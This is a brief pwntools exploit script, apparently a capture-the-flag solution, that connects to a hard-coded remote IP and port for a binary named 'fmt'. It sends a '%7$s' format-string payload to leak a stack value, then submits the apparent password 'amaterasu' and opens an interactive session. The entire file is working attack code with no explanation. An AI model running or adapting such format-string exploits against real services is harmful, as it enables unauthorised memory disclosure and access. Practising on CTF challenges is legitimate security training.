from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
#io=process("./fmt")
#io=remote("219.216.65.41",35888)
io=remote('219.216.65.41', 35684)
#gdb.attach(io)
io.recv()
io.send(b'%7$s')
#gdb.attach(io)
io.recv()
io.send(b'amaterasu')
io.interactive()